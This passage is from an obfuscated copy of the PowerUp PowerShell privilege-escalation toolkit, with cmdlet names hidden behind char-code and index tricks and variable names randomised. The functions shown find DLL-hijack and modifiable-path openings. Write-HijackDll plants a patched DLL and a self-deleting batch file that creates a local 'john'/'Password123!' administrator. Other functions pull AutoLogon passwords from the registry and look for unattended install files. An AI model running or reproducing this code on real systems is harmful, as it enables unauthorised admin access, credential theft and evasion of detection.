                        if ((-not $fe5NX9cdxjHaF1QP3vqO0Mo.Contains('C:\Windows\System32')) -and (-not (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $fe5NX9cdxjHaF1QP3vqO0Mo)) -and ($akJxXvUFXnd5eM4Bur3A2lCH -NotContains $Module.ModuleName)) {

                            $53wYf = $False

                            if ($PSBoundParameters['ExcludeWindows'] -and $fe5NX9cdxjHaF1QP3vqO0Mo.Contains('C:\Windows')) {
                                $53wYf = $True
                            }

                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $fe5NX9cdxjHaF1QP3vqO0Mo.Contains('C:\Program Files')) {
                                $53wYf = $True
                            }

                            if ($PSBoundParameters['ExcludeOwned'] -and $jtS5ONwrUKOE3HJYm.Contains($Tyfr)) {
                                $53wYf = $True
                            }

                            
                            if (-not $53wYf){
                                $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessName' $KXgec8yY1FhSnfxwJBuvWizU.ProcessName
                                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessPath' $KXgec8yY1FhSnfxwJBuvWizU.Path
                                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessOwner' $Tyfr
                                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessHijackableDLL' $fe5NX9cdxjHaF1QP3vqO0Mo
                                $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
                                $MZ8p5YquBs
                            }
                        }
                    }
                }
                catch {
                    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    
    & ([string]::join('', ( (71,101,116,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) Env:Path | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Value | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { $_.split(';') } | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_ -and ($_ -ne '')} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
        $bZ9oT7u0OmQfwAIRiMqgtC = $_
        $keplOtZMPI3wZhbUEsU3IjV = $bZ9oT7u0OmQfwAIRiMqgtC | Get-ModifiablePath -d41WGJ3bP2VD | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_ -and ($BpZKcilASnhDR0mHwzFy -ne $_) -and ($BpZKcilASnhDR0mHwzFy -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($KVopxNU496byIqgP85GewYr in $keplOtZMPI3wZhbUEsU3IjV) {
            if ($BpZKcilASnhDR0mHwzFy -ne $KVopxNU496byIqgP85GewYr.ModifiablePath) {
                $KVopxNU496byIqgP85GewYr | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty '%PATH%' $_
                $KVopxNU496byIqgP85GewYr | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name '%PATH%'
                $KVopxNU496byIqgP85GewYr.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $KVopxNU496byIqgP85GewYr
            }
        }
    }
}


function Write-HijackDll {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.HijackableDLL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Awr8sx01KB3l9zYpd6a,

        [String]
        [ValidateSet('x86', 'x64')]
        $4p,

        [String]
        [ValidateNotNullOrEmpty()]
        $gakdIFKCwUizp8EVv,

        [String]
        $MJNrf2Xbpio7GuhH = 'john',

        [String]
        $IQ2MUGLwEkxjZ = 'Password123!',

        [String]
        $nqCSfArl3vc6P = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $n2cEADWJw = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Dcg7PAwQMrbNMAn7ScBAec
    )

    function local:Invoke-PatchDll {
    

        [OutputType('System.Byte[]')]
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $LU62Fk48,

            [Parameter(Mandatory = $True)]
            [String]
            $dfJ0sXBEXVM8SfC,

            [Parameter(Mandatory = $True)]
            [String]
            $4An
        )

        $azigpRlhjr4xK53k7VwMWALed = ([System.Text.Encoding]::UTF8).GetBytes($4An)

        $mkmfzP47elbOLr48y08 = 0
        $q5wMHUAIPesx9Kt1iTm8fn = [System.Text.Encoding]::ASCII.GetString($LU62Fk48)
        $mkmfzP47elbOLr48y08 = $q5wMHUAIPesx9Kt1iTm8fn.IndexOf($dfJ0sXBEXVM8SfC)

        if ($mkmfzP47elbOLr48y08 -eq 0) {
            throw("Could not find string $dfJ0sXBEXVM8SfC !")
        }

        for ($8iqF=0; $8iqF -lt $azigpRlhjr4xK53k7VwMWALed.Length; $8iqF++) {
            $LU62Fk48[$mkmfzP47elbOLr48y08+$8iqF]=$azigpRlhjr4xK53k7VwMWALed[$8iqF]
        }

        return $LU62Fk48
    }

    if ($PSBoundParameters['Command']) {
        $RZqA01KP8lnT = $Dcg7PAwQMrbNMAn7ScBAec
    }
    else {
        if ($PSBoundParameters['Credential']) {
            $v54tkmFsMU = $n2cEADWJw.UserName
            $B2CjIvcQF67Pb0rl = $n2cEADWJw.GetNetworkCredential().Password
        }
        else {
            $v54tkmFsMU = $MJNrf2Xbpio7GuhH
            $B2CjIvcQF67Pb0rl = $IQ2MUGLwEkxjZ
        }

        if ($v54tkmFsMU.Contains('\')) {
            
            $RZqA01KP8lnT = "net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
        }
        else {
            
            $RZqA01KP8lnT = "net user $v54tkmFsMU $B2CjIvcQF67Pb0rl /add && timeout /t 5 && net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
        }
    }

    
    $XBcirpKnQwRB = ""
    $1ntQH2ZEs = ""

    if ($PSBoundParameters['Architecture']) {
        $7hLYoJHXNswO4pK5S0zRCmZEA = $4p
    }
    elseif ($BIU3V9yGRDMpzj2ugH:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        $7hLYoJHXNswO4pK5S0zRCmZEA = 'x64'
    }
    else {
        $7hLYoJHXNswO4pK5S0zRCmZEA = 'x86'
    }

    if ($7hLYoJHXNswO4pK5S0zRCmZEA -eq 'x64') {
        [Byte[]]$LU62Fk48 = [Byte[]][Convert]::FromBase64String($1ntQH2ZEs)
    }
    else {
        [Byte[]]$LU62Fk48 = [Byte[]][Convert]::FromBase64String($XBcirpKnQwRB)
    }

    if ($PSBoundParameters['BatPath']) {
        $oE2NiMCRadnyUbP1JAQwkzFG = $gakdIFKCwUizp8EVv
    }
    else {
        $FJak5iN = $Awr8sx01KB3l9zYpd6a | & ([string]::join('', ( (83,112,108,105,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) -Parent
        $oE2NiMCRadnyUbP1JAQwkzFG = "$FJak5iN\debug.bat"
    }

    
    $LU62Fk48 = Invoke-PatchDll -LU62Fk48 $LU62Fk48 -dfJ0sXBEXVM8SfC 'debug.bat' -4An $oE2NiMCRadnyUbP1JAQwkzFG

    
    if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') $oE2NiMCRadnyUbP1JAQwkzFG) { & ([string]::join('', ( (82,101,109,111,118,101,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) -xnW83q $oE2NiMCRadnyUbP1JAQwkzFG }

    "@echo off" | & (("GYbqFIhxHRMw4S-vfc31QzWmaNtyneDE9ACg7ZBr8T06XoKdVpkUJ5islPu2LOj")[61,58,26,14,4,54,56,29] -join '') -Encoding ASCII -Append $oE2NiMCRadnyUbP1JAQwkzFG
    "start /b $RZqA01KP8lnT" | & (("GYbqFIhxHRMw4S-vfc31QzWmaNtyneDE9ACg7ZBr8T06XoKdVpkUJ5islPu2LOj")[61,58,26,14,4,54,56,29] -join '') -Encoding ASCII -Append $oE2NiMCRadnyUbP1JAQwkzFG
    'start /b "" cmd /c del "%~f0"&exit /b' | & (("GYbqFIhxHRMw4S-vfc31QzWmaNtyneDE9ACg7ZBr8T06XoKdVpkUJ5islPu2LOj")[61,58,26,14,4,54,56,29] -join '') -Encoding ASCII -Append $oE2NiMCRadnyUbP1JAQwkzFG

    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) ".bat launcher written to: $oE2NiMCRadnyUbP1JAQwkzFG"
    & ([string]::join('', ( (83,101,116,45,67,111,110,116,101,110,116) |%{ ( [char][int] $_)})) | % {$_}) -Value $LU62Fk48 -Encoding Byte -b3CtzFF8zYowylvWrqwrJZd $Awr8sx01KB3l9zYpd6a
    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "$7hLYoJHXNswO4pK5S0zRCmZEA DLL Hijacker written to: $Awr8sx01KB3l9zYpd6a"

    $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'DllPath' $Awr8sx01KB3l9zYpd6a
    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Architecture' $7hLYoJHXNswO4pK5S0zRCmZEA
    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'BatLauncherPath' $oE2NiMCRadnyUbP1JAQwkzFG
    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Command' $RZqA01KP8lnT
    $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL')
    $MZ8p5YquBs
}








function Get-RegistryAlwaysInstallElevated {


    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {

        $IT1QZsFAh = (& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -7GFj6Vi5MUh9X AlwaysInstallElevated -ErrorAction SilentlyContinue)
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "HKLMval: $($IT1QZsFAh.AlwaysInstallElevated)"

        if ($IT1QZsFAh.AlwaysInstallElevated -and ($IT1QZsFAh.AlwaysInstallElevated -ne 0)){

            $Y0khI1a = (& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -7GFj6Vi5MUh9X AlwaysInstallElevated -ErrorAction SilentlyContinue)
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "HKCUval: $($Y0khI1a.AlwaysInstallElevated)"

            if ($Y0khI1a.AlwaysInstallElevated -and ($Y0khI1a.AlwaysInstallElevated -ne 0)){
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}


function Get-RegistryAutoLogon {


    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $T5eorxQ = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X AutoAdminLogon -ErrorAction SilentlyContinue)
    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "AutoAdminLogon key: $($T5eorxQ.AutoAdminLogon)"

    if ($T5eorxQ -and ($T5eorxQ.AutoAdminLogon -ne 0)) {

        $aU1Y2AL = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $uuW1w23IjtVHJPyUHJeQ = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $j8RJNNV4YW = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $02Q4LjVHI9YmVfg8eGFhYvC = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $9ZC3qlkU = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $wzI = $(& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -7GFj6Vi5MUh9X AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($uuW1w23IjtVHJPyUHJeQ -or $9ZC3qlkU) {
            $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'DefaultDomainName' $aU1Y2AL
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'DefaultUserName' $uuW1w23IjtVHJPyUHJeQ
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'DefaultPassword' $j8RJNNV4YW
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AltDefaultDomainName' $02Q4LjVHI9YmVfg8eGFhYvC
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AltDefaultUserName' $9ZC3qlkU
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AltDefaultPassword' $wzI
            $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $MZ8p5YquBs
        }
    }
}

function Get-ModifiableRegistryAutoRun {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()

    $GsEZbRpD = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $GsEZbRpD | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { & (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') $_ } | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

        $izV = & ([string]::join('', ( (71,101,116,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $_
        $pQFuNA = $_

        ForEach ($7GFj6Vi5MUh9X in $izV.GetValueNames()) {

            $b3CtzFF8zYowylvWrqwrJZd = $($izV.GetValue($7GFj6Vi5MUh9X))

            $b3CtzFF8zYowylvWrqwrJZd | Get-ModifiablePath | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Key' "$pQFuNA\$7GFj6Vi5MUh9X"
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Path' $b3CtzFF8zYowylvWrqwrJZd
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiableFile' $_
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name Key
                $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
                $MZ8p5YquBs
            }
        }
    }

    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}








function Get-ModifiableScheduledTaskFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $b3CtzFF8zYowylvWrqwrJZd = "$($BIU3V9yGRDMpzj2ugH:windir)\System32\Tasks"

    
    & (("NWPLigFVqQOdBCISuf6H-exAsT3M2z9ap8D07lYKJ5rtwn4joymXGbZvEkc1hRU")[52,21,43,20,13,60,4,37,11,14,43,21,50] -join '') -b3CtzFF8zYowylvWrqwrJZd $b3CtzFF8zYowylvWrqwrJZd -Recurse | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { -not $_.PSIsContainer } | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
        try {
            $ReLEc0nSH7OXA = $_.Name
            $TLEsdQAk81yaMZvgXu05Hf = [xml] (& (("wLxGyrV65JpFlm91OSD2zt-sdoI7vibBjNcHf0TPehXku4YRCgUnWEqaKMQA83Z")[3,40,21,22,48,25,51,21,40,51,21] -join '') $_.FullName)
            if ($TLEsdQAk81yaMZvgXu05Hf.Task.Triggers) {

                $aVC84E5p6 = $TLEsdQAk81yaMZvgXu05Hf.Task.Triggers.OuterXML

                
                $TLEsdQAk81yaMZvgXu05Hf.Task.Actions.Exec.Command | Get-ModifiablePath | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskName' $ReLEc0nSH7OXA
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskFilePath' $_
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskTrigger' $aVC84E5p6
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name TaskName
                    $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $MZ8p5YquBs
                }

                
                $TLEsdQAk81yaMZvgXu05Hf.Task.Actions.Exec.Arguments | Get-ModifiablePath | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskName' $ReLEc0nSH7OXA
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskFilePath' $_
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TaskTrigger' $aVC84E5p6
                    $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name TaskName
                    $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $MZ8p5YquBs
                }
            }
        }
        catch {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error: $_"
        }
    }
    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}


function Get-UnattendedInstallFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $GsEZbRpD = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\Panther\Unattended.xml"),
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\Panther\Unattend\Unattended.xml"),
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\Panther\Unattend.xml"),
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\Panther\Unattend\Unattend.xml"),
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\System32\Sysprep\unattend.xml"),
                            (& (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') $BIU3V9yGRDMpzj2ugH:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    
    $GsEZbRpD | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { & (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') $_ } | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
        $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
